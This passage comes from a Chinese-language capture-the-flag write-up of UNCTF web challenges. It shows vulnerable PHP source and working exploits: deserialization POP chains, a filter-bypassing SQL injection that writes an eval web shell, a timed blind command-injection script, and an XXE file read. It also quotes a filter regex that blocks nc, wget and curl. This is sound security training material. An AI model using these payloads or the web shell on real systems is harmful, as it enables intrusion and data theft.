<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exec</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-comment">// public function execute($var)&#123;</span><br>    <span class="hljs-comment">//     eval($this-&gt;content);</span><br>    <span class="hljs-comment">// &#125;</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$n</span></span>)</span>&#123;<br>        <br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-variable">$n</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// public function __get($name)&#123;</span><br><br>    <span class="hljs-comment">//     echo $this-&gt;content;</span><br>       <br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// public function __invoke()&#123;</span><br>    <span class="hljs-comment">//     $content = $this-&gt;execute($this-&gt;content);</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// public function __wakeup()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     $this-&gt;content = &quot;&quot;;</span><br>    <span class="hljs-comment">//     die(&quot;1!5!&quot;);</span><br>    <span class="hljs-comment">// &#125;</span><br><br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br><br>    <span class="hljs-comment">// public function __construct()&#123;</span><br>        <br>    <span class="hljs-comment">//     $this-&gt;test = &quot;test123&quot;;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// public function __toString()&#123;</span><br>    <span class="hljs-comment">//     $name = $this-&gt;test;</span><br>    <span class="hljs-comment">//     $name();</span><br>    <span class="hljs-comment">// &#125;</span><br><br>&#125; <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Login</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br><br>    <span class="hljs-comment">// public function __construct($name=&quot;UNCTF&quot;)&#123;</span><br><br>    <span class="hljs-comment">//     $this-&gt;name = $name;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// public function show()&#123;</span><br><br>    <span class="hljs-comment">//     echo $this-&gt;name.$this-&gt;code;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// public function __destruct()&#123;</span><br><br>    <span class="hljs-comment">//     if($this-&gt;code = &#x27;3.1415926&#x27;)&#123;</span><br>    <span class="hljs-comment">//         return $this-&gt;key-&gt;name;</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>&#125;<br><br><span class="hljs-variable">$tes</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$tes</span>-&gt;test=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Exec</span>(<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);<br><br><br><span class="hljs-variable">$log</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Login</span>();<br><span class="hljs-variable">$log</span>-&gt;key=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Exec</span>(<span class="hljs-variable">$tes</span>);<br><br><br><span class="hljs-keyword">echo</span> (<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;Exec\&quot;:1&quot;</span>,<span class="hljs-string">&quot;Exec\&quot;:2&quot;</span>,<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$log</span>)));<br></code></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744847.png" srcset="/img/loading.gif" lazyload alt="image-20221112141906660"></p>
<h2 id="随便注-云南警官学院"><a href="#随便注-云南警官学院" class="headerlink" title="随便注-云南警官学院"></a>随便注-云南警官学院</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744848.png" srcset="/img/loading.gif" lazyload alt="image-20221119102107866"></p>
<p>回显被隐藏了，用bp打的。</p>
<p>关键字替换为空，双写绕过，没有information_schema表，用mysql.innodb_table_stats代替，再无列名注入</p>
<p>过滤了：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span>,<span class="hljs-keyword">where</span>,<span class="hljs-keyword">from</span>,<span class="hljs-keyword">use</span>，<span class="hljs-keyword">update</span>，<span class="hljs-keyword">or</span>，<span class="hljs-keyword">and</span>，<span class="hljs-keyword">order</span>，<span class="hljs-keyword">show</span><br></code></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27;union+selselectect+<span class="hljs-number">1</span>,database();<span class="hljs-comment">%00 </span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744850.png" srcset="/img/loading.gif" lazyload alt="image-20221112145636027"></p>
<p>得到信息</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">database</span>:admin<br><br><span class="hljs-attribute">version</span>:<span class="hljs-number">10</span>.<span class="hljs-number">4</span>.<span class="hljs-number">13</span>-MariaDB<br><br><span class="hljs-attribute">FLAG_TABLE</span>,news,users<br><br><span class="hljs-attribute">ctftraining</span>,mysql<br></code></pre></td></tr></table></figure>

<p>查表</p>
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs prolog">?id=<span class="hljs-string">0&#x27;u</span>nion+selselectect+<span class="hljs-number">5</span>,(selselectect+group_concat(<span class="hljs-string">`1`</span>)+frfromom+(selselectect+<span class="hljs-number">1</span>+union+seleselectct+*+frfromom<span class="hljs-comment">/**/</span>ctftraining.<span class="hljs-symbol">FLAG_TABLE</span>)a);<span class="hljs-comment">%00</span><br><br></code></pre></td></tr></table></figure>

<p>flag不在表内</p>
<p>写马</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">?id=<span class="hljs-number">0</span>&#x27;union+selselectect+5,0x3c3f<span class="hljs-number">70687020657661</span>6c<span class="hljs-number">2824</span>5f504f<span class="hljs-number">5354</span>5b636d645d293b3f3e+into+dumpfile+&quot;/var/www/html/shell.php&quot;;%00<br></code></pre></td></tr></table></figure>

<p>flag在根目录。</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744851.png" srcset="/img/loading.gif" lazyload alt="image-20221112205821555"></p>
<h2 id="poppop-中国人民公安大学"><a href="#poppop-中国人民公安大学" class="headerlink" title="poppop-中国人民公安大学"></a>poppop-中国人民公安大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744852.png" srcset="/img/loading.gif" lazyload alt="image-20221119102119802"></p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;code = <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;key;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$key2</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;key2-&gt;<span class="hljs-title function_ invoke__">abab</span>();<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;poc&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;poc&#x27;</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-comment">// function __call($method,$args)&#123;</span><br>    <span class="hljs-comment">//     eval($this-&gt;code);</span><br><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-comment">// function __wakeup()&#123;</span><br>    <span class="hljs-comment">//     $this-&gt;code = &quot;&quot;;</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-comment">// function __destruct()&#123;</span><br>    <span class="hljs-comment">//     echo $this-&gt;key;</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$key2</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key2=<span class="hljs-variable">$a</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// function __toString()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     return $this-&gt;key2-&gt;abab();</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125; <br><span class="hljs-variable">$a1</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$a1</span>-&gt;code=<span class="hljs-string">&quot;phpinfo();&quot;</span>;<br><br><span class="hljs-variable">$c1</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(<span class="hljs-variable">$a1</span>);<br><br><br><span class="hljs-variable">$b1</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><span class="hljs-variable">$b1</span>-&gt;key=<span class="hljs-variable">$c1</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;A\&quot;:1&quot;</span>,<span class="hljs-string">&quot;A\&quot;:2&quot;</span>,<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b1</span>)));<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744853.png" srcset="/img/loading.gif" lazyload alt="image-20221112214932820"></p>
<h2 id="easy-rce-西南科技大学"><a href="#easy-rce-西南科技大学" class="headerlink" title="easy_rce-西南科技大学"></a>easy_rce-西南科技大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744854.png" srcset="/img/loading.gif" lazyload alt="image-20221119102131577"></p>
<p>rce布尔盲注</p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment"># flag in /flag</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br><br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\@|\#|\%|:|&amp;|;|\\\\|&quot;|\&#x27;|`|\.|\&amp;|\*|&gt;|&lt;|nc|wget|bash|sh|netcat|grep|base64|rev|curl|wget|php|ping|cat|fl|mkdir/i&#x27;</span>,<span class="hljs-variable">$code</span>))&#123;<br><br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$code</span>,<span class="hljs-variable">$output</span>,<span class="hljs-variable">$return_val</span>);<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$return_val</span>)   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success&quot;</span>;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail&quot;</span>; <br>        &#125;<br>                    <br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;小黑子,露出只因脚了吧&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>发现</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span> [ t == t ]%0athen <span class="hljs-keyword">sleep</span> <span class="hljs-number">3</span>%0afi<br></code></pre></td></tr></table></figure>

<p>成功执行。可以截取字符进行逐个比对。</p>
<p>;用%0a绕过，&#96;用$()绕过。</p>
<p>得到命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=<span class="hljs-keyword">if</span> [ $(<span class="hljs-built_in">tac</span> /f?ag |awk NR=1 |<span class="hljs-built_in">cut</span> -c 1) == U ]%0a <span class="hljs-keyword">then</span> <span class="hljs-built_in">sleep</span> 3%0afi<br></code></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>cmd = <span class="hljs-string">&#x27;tac /f?ag&#x27;</span><br>result = <span class="hljs-string">&#x27;&#x27;</span><br>proxies=&#123;<span class="hljs-string">&#x27;http&#x27;</span>:<span class="hljs-string">&#x27;http://127.0.0.1:8080&#x27;</span>,<span class="hljs-string">&#x27;https&#x27;</span>:<span class="hljs-string">&#x27;https://127.0.0.1:8080&#x27;</span>&#125;<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">128</span>):<br>        time.sleep(<span class="hljs-number">0.5</span>)<br>        payload = <span class="hljs-string">f&quot;if [ $(<span class="hljs-subst">&#123;cmd&#125;</span> |awk NR==1|cut -c <span class="hljs-subst">&#123;j&#125;</span>) == <span class="hljs-subst">&#123;<span class="hljs-built_in">chr</span>(k)&#125;</span> ]%0a then sleep 1%0afi&quot;</span><br>        payload = <span class="hljs-string">&#x27;?code=&#x27;</span> + payload<br>        <span class="hljs-comment"># print(payload)</span><br>        <span class="hljs-comment"># break</span><br>        url = <span class="hljs-string">&#x27;http://1c6e61dc-14c1-4eaf-b82d-477f7ea47fb2.node.yuzhian.com.cn/&#x27;</span><br>        t1=time.time()<br>        requests.get(url + payload)<br>        t2=time.time()<br>        <span class="hljs-keyword">if</span> t2-t1&gt;<span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">print</span>(t2-t1)<br>            result+=<span class="hljs-built_in">chr</span>(k)<br>            <span class="hljs-built_in">print</span>(payload)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br><br>result = result + <span class="hljs-string">&quot;\n&quot;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744855.png" srcset="/img/loading.gif" lazyload alt="image-20221118222858306"></p>
<h2 id="ezgame-浙江师范大学"><a href="#ezgame-浙江师范大学" class="headerlink" title="ezgame-浙江师范大学"></a>ezgame-浙江师范大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744856.png" srcset="/img/loading.gif" lazyload alt="image-20221118203634618"></p>
<p>main.js搜索UNCTF发现以下字段，组合得到flag，注意对比之前flag的格式</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a27d</span>-<span class="hljs-number">6</span>f88-<br><br><span class="hljs-attribute">49fb</span>-a510-<br><br><span class="hljs-attribute">fe7b163f8d</span><br><br><span class="hljs-attribute">unctf</span>&#123;c5f9<br><br><span class="hljs-attribute">d3</span>&#125;<br></code></pre></td></tr></table></figure>

<p>UNCTF{c5f9a27d-6f88-49fb-a510-fe7b163f8dd3}</p>
<p>UNCTF{c5f949fb-a510-a27d-6f88-fe7b163f8dd3}</p>
<p>试一下就行</p>
<h2 id="听说php有一个xxe-西南科技大学"><a href="#听说php有一个xxe-西南科技大学" class="headerlink" title="听说php有一个xxe-西南科技大学"></a>听说php有一个xxe-西南科技大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744857.png" srcset="/img/loading.gif" lazyload alt="image-20221119102153137"></p>
<p>dom.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>); <br><span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>(); $<br>dom-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$data</span>); <br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$dom</span>);<br></code></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; <br>&lt;!DOCTYPE xxe [ <br>&lt;!ELEMENT name ANY &gt; <br>&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot; &gt;]&gt; <br>&lt;root&gt; <br>&lt;name&gt;&amp;xxe;&lt;/name&gt; <br>&lt;/root&gt;<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744858.png" srcset="/img/loading.gif" lazyload alt="image-20221112225449261"></p>
<h2 id="babyphp-中国人民公安大学"><a href="#babyphp-中国人民公安大学" class="headerlink" title="babyphp-中国人民公安大学"></a>babyphp-中国人民公安大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744859.png" srcset="/img/loading.gif" lazyload alt="image-20221119102214570"></p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]==<span class="hljs-number">0</span>&amp;&amp;<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]!==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;key1&quot;</span>])&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;key2&quot;</span>]))&#123;<br>            <span class="hljs-variable">$key1</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;key1&quot;</span>];<br>            <span class="hljs-variable">$key2</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;key2&quot;</span>];<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$key1</span>!==<span class="hljs-variable">$key2</span>&amp;&amp;<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$key1</span>)==<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$key2</span>))&#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;code&quot;</span>]))&#123;<br>                    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;code&quot;</span>];<br>                    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|txt|cat|tac|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$code</span>))&#123;<br>                        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>                    &#125;<span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;有手就行&lt;/br&gt;&quot;</span>;<br>                    &#125;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;老套路了&lt;/br&gt;&quot;</span>;<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span 